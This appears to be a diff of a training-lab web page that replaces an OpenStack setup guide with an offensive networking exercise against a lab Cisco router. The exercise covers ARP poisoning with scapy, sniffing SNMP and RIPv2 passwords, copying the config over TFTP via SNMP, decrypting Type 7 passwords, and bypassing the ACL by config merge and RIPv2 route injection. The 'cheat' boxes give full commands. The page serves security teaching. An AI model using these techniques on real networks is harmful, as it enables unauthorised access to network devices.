@@ -187,64 +187,7 @@
         </div>
       </div>
     </div>
-  <div class="modal-dialog modal-lg">
-    <div class="modal-content">
-      <div class="modal-header">
-        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
-        <h3 class="modal-title" id="myModalLabel">OpenStack OpFlex Lab</h3>
-      </div>
-      <div class="modal-body">
-		<div class="row">
-            <div class="col-lg-4 col-md-4 col-sm-6 col-xs-12">
-                <img src="./os_files/OpenStack-logo.png" class="img-responsive">
-            </div>
-            <div class="col-lg-8 col-md-8 col-sm-6 col-xs-12">
-                <p>
-                    The purpose of this lab is to provide the student a better understanding of the Cisco ACI OpenStack
-                    integration. This new integration utilizng OpFlex technology provides for better scaling and
-                    functionality of OpenStack by leveraging the advantages of the ACI fabric to provide
-                    multi-tenant networks that scale into the millions.
-                </p>
-                <p>
-                    ACI provides advanced telemetry of networks by keeping a marriage of the underlay and the overlay
-                    applications that use it. The new OpFlex integration provides a view of the telemetry of the
-                    OpenStack compute environments into the ACI infrastructure. This provides the ability to
-                    optimize operational efficiencies that are required for the agile networks of tomorrow.
-                </p>
-            </div>
-        </div>
-        <div class="row">
-            <p>
-                This lab uses real physical equipment for both OpenStack and ACI enhancing the experience of
-                how the integration works. Focused on both APIC/ML2 and the GBP integration models, the student
-                will see the differences between both models and how these integrate into ACI. This also highlights
-                how the GBP (group based policy) model benefits the DEV-OPS operational model by simplifying
-                the network for the application developer interacting with OpenStack.
-            </p>
-        </div>
-		<div class="row" style="margin-top:20px;">
-			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
-				<strong>Rafael Muller</strong><br>
-                Principal Engineer<br>
-				rmuller@cisco.com<br>
-			</div>
-			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
-				<strong>Luis Flores</strong><br>
-                System Enginer Sales<br>
-				luflores@cisco.com<br>
-			</div>
-			<div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
-				<strong>Cesar Obediente</strong><br>
-                Principal Engineer<br>
-				cobedien@cisco.com<br>
-			</div>
-		</div>
-      </div>
-      <div class="modal-footer">
-        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
-      </div>
-    </div>
-  </div>
+
 </div>
 
 		<!-- <div class="container"> -->
@@ -253,411 +196,459 @@
 
 
 <div class="container">
-<h1>Configure base Operating System on Controller</h1>
-    <p>As with any Linux application installation, there are some operating system parameters that need to be modified
-    to facilitate the operation of your application.  Adjustments to the firewall and NTP are required for an
-    operational OpenStack deployment. We have grouped the requirements ahead of each component installation of
-    OpenStack.</p>
-<h2>Use of RedHat Enterprise Linux for this lab</h2>
-    <p>RedHat Enterprise Linux (RHEL) is the preferred distribution of many Enterprise
-    accounts. That being said, OpenStack can be installed on many different Linux distributions, including Canonical's
-    Ubuntu. Please refer to Cisco's documentation for instructions on how to integrate with other Cisco products
-        leveraging their respectives plugins at
-    <a href="http://www.cisco.com/go/openstack">http://www.cisco.com/go/openstack</a></p>
-<div class="clearfix"></div>
-<!--
-########################################################################################################################
-Step
-########################################################################################################################
--->
-<p>In this lab, you will have access to one UCS-C220 host to run OpenStack. This node will run the OpenStack
-    Controller, the Openstack Compute and the Openstack Network in the same UCS-C220. This will allow us to take the
-    All-In-One (AIO) approach. It is important to note that in a production environment, you
-    will have many compute nodes on which you will be running your OpenStack instances (vm's). Plus dedicated nodes
-    for different Openstack functions. </p>
-
-<p>Perform OS modifications on your AIO Node by connecting to <b>pod01-compute1 </b> in PuTTY
-    Connection Manager.</p>
-
-<h3>Step 1 - Configure NTP for proper time synchronization</h3>
-<p>In OpenStack it is <strong>critical</strong> to have proper time synchronization across each of the component hosts.
-    In RHEL the default time protocol is called Chrony. Chrony is a variation of the NTPd engine of linux that is
-    designed for dis-association of NTP resources ( for example laptops that lose access to their network clocks ).
-    In your OpenStack environment you can run either Chrony or NTPd as needed. For the purpose of this lab we will
-    be using chrony and it has been pre-configured for you.</p>
+<h1>Networking</h1>
+ In this module, break into the IOS router at the center of the network using TELNET and a locally configured username and password.
 
 
+<h2>Exercise 1 : Grab the Complete Router Configuration and Decrypt Passwords</h2>
 
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
+<img src="os_files/seccon-becoming-a-hacker-net-topo.png" width="75%" height="75%">
+
+<hr><br>
+A partial router configuration is provided:
+
+<pre>
+hostname router
+!
+interface Loopback0
+ ip address 192.168.3.1 255.255.255.255
+!
+logging host 192.168.1.4
+!
+snmp-server community <community-string> RW 1
+snmp-server host 192.168.1.4 version 2c <community-string>
+!
+access-list 1 permit 192.168.1.4 log
+access-list 2 permit 192.168.1.5 log
+access-list 2 permit 192.168.4.1 log
+!
+line vty 0 4
+ access-class 2 in
+ transport input ssh telnet
+
+</pre>
+
+<h3>Task 1</h3>
+
+<p>Using&nbsp;<tt>tshark</tt>&nbsp;or&nbsp;<a class="http" href="http://wiresharkdownloads.riverbed.com/video/wireshark/introduction-to-wireshark/">Wireshark</a>, discover the SNMPv2 community string used in Traps sent to&nbsp;<strong>windows.seccon.ninja</strong>. The Get/Set community string uses the same password</p>
+
+<pre>
+  root@bah-pod1-kali:~# <strong> host windows.seccon.ninja</strong>
+  windows.seccon.ninja has address 192.168.1.4
+  root@bah-pod1-kali:~# <strong> scapy</strong>
+  Welcome to Scapy (2.2.0)
+  >>> arpcachepoison('192.168.1.1','192.168.1.4')
+  .
+  Sent 1 packets.
+  .^Z
+  [1]+  Stopped                 sudo scapy
+
+
+  root@bah-pod1-kali:~# <strong> bg</strong>
+  [1]+ sudo scapy &
+
+  root@bah-pod1-kali:~# <strong> tshark -i eth1 -V udp port 162</strong>
+  Capturing on 'eth1'
+  Frame 1: 443 bytes on wire (3544 bits), 443 bytes captured (3544 bits) on interface 0
+  ...
+  Simple Network Management Protocol
+      version: v2c (1)
+      community: *****
+      data: snmpV2-trap (7)
+          snmpV2-trap
+              request-id: 5114
+              error-status: noError (0)
+              error-index: 0
+              variable-bindings: 15 items
+  ...
+</pre>
+
+
+<h3>Task 2</h3>
+
+<p>Using the discovered SNMPv2 community string and the&nbsp;<a class="http" href="http://tools.cisco.com/Support/SNMP/do/BrowseMIB.do?local=en&amp;mibName=CISCO-CONFIG-COPY-MIB">Cisco-Config-Copy-MIB</a>, make the router upload its configuration via TFTP to&nbsp;<strong>kali.seccon.ninja</strong>. The uploaded configuration should be placed in&nbsp;<tt>/srv/tftp</tt>. A tool using&nbsp;<a class="http" href="http://www.secdev.org/projects/scapy/doc/">Scapy</a>&nbsp;is provided to help you with this. (&nbsp;<tt>~/labs/networking/get-cisco-cfg.py</tt>&nbsp;) An access control list (ACL) configured on the router is blocking you--<strong>bypass it!</strong>&nbsp;Verify the TFTP server is running:</p>
+
+
+ <!-- this is a copy /paste block - put the title and the code you want to copy and paste - or ask Omar -->
+ <div class="topbar">
+   <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Netstat</div>
+   <div class="topbarbutton"></div> </div>
+ <div class="commandblock"> <div class="copyseqnumber"> 1 <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-1">Copy</button></div>
+ <div class="ciscohl2" id="copy-1" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
+   <!-- put the code here -->
+   <pre>
+ netstat -lun | grep 69
+   </pre>
+   </div></div>
+   <!-- end of copy /paste block -->
+
+<hr><br>
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<a target="blank" data-toggle="modal" data-target="#Hint1" href="#">+ Click here for Hint</a>
+<div class="modal fade" id="Hint1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Hint </h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+
+Help for get-cisco-cfg.py.
+      <pre>
+        root@bah-pod1-kali:~/labs/networking# ./get-cisco-cfg.py -h
+        WARNING: No route found for IPv6 destination :: (no default route?)
+        Usage: get-cisco-cfg.py [options]
+
+        Options:
+          -h, --help            show this help message and exit
+          -i IFACE, --iface=IFACE
+                                Interface
+          -s SRCIP, --src=SRCIP
+                                Source IP Address
+          -d DSTIP, --dst=DSTIP
+                                Destination IP Address
+          -t TFTPIP, --tftp=TFTPIP
+                                TFTP Server IP Address
+          -f CFG_FILE, --cfg=CFG_FILE
+                                Configuration Filename
+          -c SNMPSTRING, --community=SNMPSTRING
+                                SNMP Community Set String
+      </pre>
+
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+      </div>
     </div>
+</div>
+</div>
+
+<!--end hint -->
 
 
-<div class="commandblock">
-    <div class="copyseqnumber">
-        1
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-1">Copy</button>
+<br><br>
+
+
+     <!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+     <a target="blank" data-toggle="modal" data-target="#Cheat2" href="#"> ++ Click here for Cheat</a>
+     <div class="modal fade" id="Cheat2" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+       <div class="modal-dialog modal-lg">
+         <div class="modal-content">
+           <div class="modal-header">
+             <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+             <h3 class="modal-title" id="myModalLabel">Cheat </h3>
+           </div>
+           <div class="modal-body">
+         <div class="row">
+
+     Running get-cisco-cfg.py
+           <pre>
+     root@bah-pod1-kali:~/labs/networking# ./get-cisco-cfg.py -i eth1 -s 192.168.1.4 -d 192.168.1.1 -t 192.168.2.2 -f my-config -c <removed>
+     WARNING: No route found for IPv6 destination :: (no default route?)
+     Attempting to download IOS config from 192.168.1.1
+     .
+     Sent 1 packets.
+     .
+     Sent 1 packets.
+     .
+     Sent 1 packets.
+     .
+     Sent 1 packets.
+     .
+     Sent 1 packets.
+     .
+     Sent 1 packets.
+     .
+     Sent 1 packets.
+           </pre>
+
+     <hr><br>
+     Viewing TFTP configuration
+
+     <pre>
+     root@bah-pod1-kali:~/labs/networking# more tftp/my-config
+     !
+     version 15.5
+     service timestamps debug datetime msec
+     service timestamps log datetime msec
+     service password-encryption
+     !
+     hostname router
+     !
+     boot-start-marker
+     boot-end-marker
+     !
+     !
+     ...
+     </pre>
+
+             </div>
+           </div>
+           <div class="modal-footer">
+             <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+           </div>
+         </div>
+     </div>
+     </div>
+
+     <!--end hint -->
+
+     <hr>
+
+
+
+<h3>Task 3</h3>
+
+<p>The administrator password is weakly encrypted with the Type 7 scheme. Decrypt the administrator password using the&nbsp;<tt>ciscodecrypt</tt>tool. You'll have to build the tool using the provided&nbsp;<a class="http" href="http://en.wikipedia.org/wiki/Makefile#Execution">Makefile</a>. Here's an example of use:</p>
+
+<pre>
+  root@bah-pod1-kali:~/labs/networking/ciscodecrypt# ./ciscodecrypt -p 0518030C22434048
+  password: seccon!
+</pre>
+
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<a target="blank" data-toggle="modal" data-target="#Cheat1" href="#"> ++ Click here for Cheat</a>
+<div class="modal fade" id="Cheat1" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat </h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+
+Building ciscodecrypt
+      <pre>
+root@bah-pod1-kali:~/labs/networking/ciscodecrypt# make
+cc  -o ciscodecrypt  ciscodecrypt.c
+ciscodecrypt.c: In function ‘cdecrypt’:
+ciscodecrypt.c:28:12: warning: incompatible implicit declaration of built-in function ‘strlen’ [enabled by default]
+ciscodecrypt.c: In function ‘main’:
+ciscodecrypt.c:140:44: warning: incompatible implicit declaration of built-in function ‘strlen’ [enabled by default]
+      </pre>
+
+
+<hr><br>
+
+Running ciscodecrypt
+
+<pre>
+root@bah-pod1-kali:~/labs/networking# more tftp/my-config
+root@bah-pod1-kali:~/labs/networking/ciscodecrypt# ./ciscodecrypt -p 0955411C54174711004D
+password: &lt;removed&gt;
+root@bah-pod1-kali:~/labs/networking/ciscodecrypt# ./ciscodecrypt -p 0818696F213B24352B
+password: &lt;removed&gt;
+...
+</pre>
+
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+      </div>
     </div>
-<div class="ciscohl2" id="copy-1" style="background: url(&quot;/static/images/ok.png&quot;) right bottom / 45px 45px no-repeat rgb(224, 255, 203);">
-<pre># This is the copy group: 1<br>
+</div>
+</div>
 
-<code>
-systemctl status chronyd
-</code>
+<!--end hint -->
 
+<hr>
+
+
+<h2>Exercise 2 : Break into the IOS router at the center of the network using TELNET and the administrator username and password.</h2>
+
+<h3>Task 1</h3>
+<p>The administrator is only allowed to log in from&nbsp;<strong>windows.seccon.ninja</strong>. Without logging into this machine, figure out how to bypass this. See the&nbsp;<strong>Bonus</strong>&nbsp;section below.</p>
+
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<a target="blank" data-toggle="modal" data-target="#Cheat3" href="#"> ++ Click here for Cheat</a>
+<div class="modal fade" id="Cheat3" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat </h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+
+Edit /srv/tftp/to-apply.cfg
+
+<pre>
+root@bah-pod1-kali:~/labs/networking# nano /srv/tftp/to-apply.cfg
+</pre>
+<pre>
+root@bah-pod1-kali:~/labs/networking# cat /srv/tftp/to-apply.cfg
+!
+no access-list 2
+access-list 2 permit 192.168.1.4
+access-list 2 permit 192.168.4.1
+access-list 2 permit 192.168.2.2
+!
+! Don't forget end! :-)
+end
+.
+</pre>
+
+<hr><br>
+Merge configuration
+
+<pre>
+root@bah-pod1-kali:~/labs/networking# sudo ./merge-cisco-cfg.py -i eth1 -s 192.168.1.4 -d 192.168.1.1 -t 192.168.2.2 -f to-apply.cfg -c &lt;removed&gt;
+WARNING: No route found for IPv6 destination :: (no default route?)
+Attempting to upload IOS config to 192.168.1.1
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+
+</pre>
+<hr><br>
+Log in
+<pre>
+root@bah-pod1-kali:~/labs/networking# ssh admin@router
+
+                                NOTICE
+
+  Use of this system is RESTRICTED. Access is limited to individuals
+  authorized by Cisco SecCon...
+
+Password:
+...
+router#
+</pre>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+      </div>
+    </div>
+</div>
+</div>
+
+<!--end hint -->
+
+<hr>
+
+<h3>Bonus</h3>
+Do this without changing the router's running configuration to bypass the configured ACL or using ARP cache poisoning. <br>
+
+
+
+<!--this is a hint, I tried to do it using a modal like the about section, ask me (Omar) if you run into any problems - change the hint #-->
+<a target="blank" data-toggle="modal" data-target="#Cheat4" href="#"> ++ Click here for Cheat</a>
+<div class="modal fade" id="Cheat4" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-lg">
+    <div class="modal-content">
+      <div class="modal-header">
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+        <h3 class="modal-title" id="myModalLabel">Cheat</h3>
+      </div>
+      <div class="modal-body">
+    <div class="row">
+
+Discover the RIPv2 Password
+<pre>
+root@bah-pod1-kali:~/labs/networking# tshark -i eth2 -V udp port 520
+Capturing on 'eth2'
+Frame 1: 106 bytes on wire (848 bits), 106 bytes captured (848 bits) on interface 0
+    Interface id: 0
+...
+Routing Information Protocol
+    Command: Response (2)
+    Version: RIPv2 (2)
+    Authentication: Simple Password
+        Authentication type: Simple Password (2)
+        Password: &lt;removed&gt;
+</pre>
+<hr><br>
+
+Configure IP Address for Overridden Route
+<pre>
+root@bah-pod1-kali:~/labs/networking# ip route
+default via 192.168.1.1 dev eth1
+169.254.169.254 via 192.168.0.100 dev eth0
+192.168.0.0/24 dev eth0  proto kernel  scope link  src 192.168.0.104
+192.168.1.0/24 dev eth1  proto kernel  scope link  src 192.168.1.2
+192.168.2.0/24 dev eth2  proto kernel  scope link  src 192.168.2.2
+192.168.4.248/29 via 192.168.0.254 dev eth0
+seccon@pod-XX-kali:~/labs/networking$ sudo ip address add 192.168.1.5/32 dev eth2
+seccon@pod-XX-kali:~/labs/networking$ sudo ip route add 192.168.3.1/32 via 192.168.2.1 src 192.168.1.5
+seccon@pod-XX-kali:~/labs/networking$ ip route
+default via 192.168.1.1 dev eth1
+169.254.169.254 via 192.168.0.100 dev eth0
+192.168.0.0/24 dev eth0  proto kernel  scope link  src 192.168.0.104
+192.168.1.0/24 dev eth1  proto kernel  scope link  src 192.168.1.2
+192.168.2.0/24 dev eth2  proto kernel  scope link  src 192.168.2.2
+192.168.3.1 via 192.168.2.1 dev eth2  src 192.168.1.5
+192.168.4.248/29 via 192.168.0.254 dev eth0
+</pre>
+<hr><br>
+
+
+Inject RIPv2 Route
+<pre>
+root@bah-pod1-kali:~/labs/networking# ./inject.py -h
+WARNING: No route found for IPv6 destination :: (no default route?)
+Usage: inject.py [options]
+
+Options:
+  -h, --help            show this help message and exit
+  -i IFACE, --iface=IFACE
+                        Interface
+  -p PASSWORD, --password=PASSWORD
+                        RIPv2 Password
+  -r ROUTE, --route=ROUTE
+                        RIPv2 Prefix
+  -m MASK, --mask=MASK  RIPv2 Subnet Mask
+seccon@pod-XX-kali:~/labs/networking$ sudo ./inject.py -i eth2 -p <removed> -r 192.168.1.5 -m 255.255.255.255
+WARNING: No route found for IPv6 destination :: (no default route?)
+Attempting to inject RIPv2 route.  It will last about 240 seconds
+.
+Sent 1 packets.
+
+</pre>
+<hr><br>
+
+Log in
+<pre>
+root@bah-pod1-kali:~/labs/networking# telnet 192.168.3.1
+...
+User Access Verification
+
+Username: admin
+Password:
+...
+router#
 </pre>
 </div>
 </div>
-
-
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-<div class="commandblock">
-<div class="">
-<pre><strong>pod01-compute1#</strong> systemctl status chronyd
-chronyd.service - NTP client/server
-   Loaded: loaded (/usr/lib/systemd/system/chronyd.service; enabled)
-   Active: <b><span style="color:green">active (running)</span> </b> since Mon 2015-10-12 11:20:09 EDT; 59s ago
-  Process: 25969 ExecStartPost=/usr/libexec/chrony-helper add-dhclient-servers (code=exited, status=0/SUCCESS)
-  Process: 25966 ExecStart=/usr/sbin/chronyd -u chrony $OPTIONS (code=exited, status=0/SUCCESS)
- Main PID: 25968 (chronyd)
-   CGroup: /system.slice/chronyd.service
-           └─25968 /usr/sbin/chronyd -u chrony
-
-Oct 12 11:20:09 devpod1-openstack-controller.cisco.com systemd[1]: Starting NTP client/server...
-Oct 12 11:20:09 devpod1-openstack-controller.cisco.com chronyd[25968]: chronyd version 1.29.1 starting
-Oct 12 11:20:09 devpod1-openstack-controller.cisco.com chronyd[25968]: Linux kernel major=3 minor=10 patch=0
-Oct 12 11:20:09 devpod1-openstack-controller.cisco.com chronyd[25968]: hz=100 shift_hz=7 freq_scale=1.00000000 nominal_tick=1...l=2
-Oct 12 11:20:09 devpod1-openstack-controller.cisco.com chronyd[25968]: Frequency -78.309 +/- 0.032 ppm read from /var/lib/chr...ift
-Oct 12 11:20:09 devpod1-openstack-controller.cisco.com systemd[1]: Started NTP client/server.
-Oct 12 11:20:14 devpod1-openstack-controller.cisco.com chronyd[25968]: Selected source 172.18.106.1
-Hint: Some lines were ellipsized, use -l to show in full.
-</pre>
+<div class="modal-footer">
+<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
+</div>
+</div>
 </div>
 </div>
 
+<!--end hint -->
 
-<p>To get the information on the status of what chrony tracking, use <code>chronyc tracking</code>.</p>
-
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        2
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-2">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-2">
-<pre># This is the copy group: 2<br>
-
-<code>
-chronyc tracking
-</code>
-
-</pre>
-</div>
-</div>
-
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-<div class="commandblock">
-<div class="">
-<pre># chronyc tracking
-Reference ID    : 10.0.236.10 (ntp-vlan336.ecatsrtpdmz.cisco.com)
-Stratum         : 3
-Ref time (UTC)  : Tue Jan  6 14:42:10 2015
-System time     : 93476.671875000 seconds slow of NTP time
-Last offset     : -0.000186148 seconds
-RMS offset      : 3119.961914062 seconds
-Frequency       : 48.261 ppm fast
-Residual freq   : -0.011 ppm
-Skew            : 8.250 ppm
-Root delay      : 0.020065 seconds
-Root dispersion : 0.023922 seconds
-Update interval : 479.2 seconds
-Leap status     : Normal
-</pre>
-</div>
-</div>
-
-<!--
-##############################################################################################################################
-Step
-##############################################################################################################################
--->
-<h3>Step 2 - Configure HOSTS file for Name Resolution</h3>
-<p>Setting proper hostnames definition plays a key role in the setup of various components of OpenStack ( in particular
-    RabbitMQ - RabiitMQ will be discussed in the upcoming chapter). There are three things that need to match for
-    RabbitMQ to properly operate. The first part is that the hostname is correct in the file /etc/hosts. The second is
-    the environment variable HOSTNAME that is derived in the system. The third is the hostname definition in
-    /etc/hostname. </p>
-
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        3
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-3">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-3" style="background-color: #e0ffcb;">
-<pre># This is the copy group: 3<br>
-
-<code>
-cat &lt;&lt;EOF &gt; /etc/hosts
-127.0.0.1   localhost localhost.localdomain
-10.0.236.101  pod01-compute1 pod01-compute1.ecatsrtpdmz.cisco.com
-EOF
-</code>
-
-</pre>
-</div>
-</div>
-
-
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        4
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-4">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-4">
-<pre># This is the copy group: 4<br>
-
-<code>
-cat &lt;&lt;EOF &gt; /etc/hostname
-pod01-compute1
-EOF
-</code>
-
-</pre>
-</div>
-</div>
-
-
-<!--
-##############################################################################################################################
-Step
-##############################################################################################################################
--->
-<h3>Step 3 - Disable Network Manager Service and enable network</h3>
-
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        5
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-5">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-5" style="background-color: #e0ffcb;">
-<pre># This is the copy group: 5<br>
-
-<code>
-systemctl disable NetworkManager.service
-systemctl stop NetworkManager.service
-systemctl mask NetworkManager.service
-
-
-
-chkconfig network on
-systemctl restart network
-</code>
-
-</pre>
-</div>
-</div>
-
-
-
-<!--
-##############################################################################################################################
-Step
-##############################################################################################################################
--->
-<h3>Step 4 - Install OpenStack and OpenStack Utilities</h3>
-    <p>
-        For this lab we have setup a local repository with all the appropriate packages related to RedHat enterprise
-        Linux snapshot to specific package versions. This insures that the lab has consistent results since the upstream
-        code base is the same. In your production environment you will always want to create a repository and install
-        from the same base code to insure consistency when installing different compute hosts over time. We will
-        show more details on the package details for you in another chapter including inserting the Cisco OpFLex
-        packages into the repository to be able to install them automatically.
-    </p>
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        6
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-6">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-6">
-<pre># This is the copy group: 6<br>
-
-<code>
-yum -y install openstack-selinux openstack-utils
-</code>
-
-</pre>
-</div>
-</div>
-
-
-<!--
-##############################################################################################################################
-Step
-##############################################################################################################################
--->
-<h3>Step 5- Upgrade system packages</h3>
-    <p>
-        Upgrade all the packages from the original ISO PXEBOOT install disk.
-    </p>
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        7
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-7">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-7">
-<pre># This is the copy group: 7<br>
-
-<code>
-yum makecache
-yum -y upgrade
-</code>
-
-</pre>
-</div>
-</div>
-
-
-<!--
-########################################################################################################################
-Step
-########################################################################################################################
--->
-
-<h3>Step 6 - Create OpenStack client environment scripts</h3>
-<p> OpenStack supports simple client environment scripts also known as OpenRC files. These scripts typically contain
-    common options for all clients,  but also support unique options.</p>
-<p>Create client environment scripts for the admin projects. Future portions of this guide
-    reference these scripts to load appropriate credentials for client operations.</p>
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        8
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-8">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-8">
-<pre># This is the copy group: 8<br>
-
-<code>
-cd ~
-cat &lt;&lt; EOF &gt; admin.sh
-export OS_REGION_NAME=RegionOne
-export OS_PROJECT_DOMAIN_ID=default
-export OS_USER_DOMAIN_ID=default
-export OS_PROJECT_NAME=admin
-export OS_TENANT_NAME=admin
-export OS_USERNAME=admin
-export OS_PASSWORD=cisco.123
-export OS_AUTH_URL=http://10.0.236.101:35357/v3
-export OS_NOVA_AUTH=http://10.0.236.101:5000/v2.0
-export PS1='[\u@\h \W(openstack_admin)]# '
-EOF
-chmod +x admin.sh
-</code>
-
-</pre>
-</div>
-</div>
-
-
-
-<!--
-########################################################################################################################
-Step
-########################################################################################################################
--->
-<h3>Step 7 - Verify identity shell</h3>
-<p>You can validate that each shell is working properly by executing the shell command via the <code>#source</code>
-    command.</p>
-
-
-    <div class="topbar">
-        <div class="topbartitle" style="font-size:.8em;"><i class="fa fa-server" style="margin-right:10px;display:inline;"></i>Controller/Compute POD1</div>
-        <div class="topbarbutton"></div>
-    </div>
-
-
-<div class="commandblock">
-    <div class="copyseqnumber">
-        9
-        <button class="btn btn-xs btn-danger copybutton" data-clipboard-target="#copy-9">Copy</button>
-    </div>
-<div class="ciscohl2" id="copy-9">
-<pre># This is the copy group: 9<br>
-
-<code>
-cd ~; source admin.sh
-</code>
-
-</pre>
-</div>
-</div>
 
 
 
@@ -669,8 +660,8 @@ cd ~; source admin.sh
     <div style="float:right; font-size: .9em;">
 
             <div class="btn-group">
-                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;/pod1/basics/lldp&#39;">Next: LLDP Daemon</button>
-                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;/pod1/basics/lldp&#39;">
+                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;module5.html&#39;">Next: Module 5</button>
+                <button type="button" class="btn btn-md btn-success" onclick="window.location.href=&#39;module5.html&#39;">
                         <span class="glyphicon glyphicon-chevron-right" style="color:white;" aria-hidden="true"></span>
                 </button>
             </div>
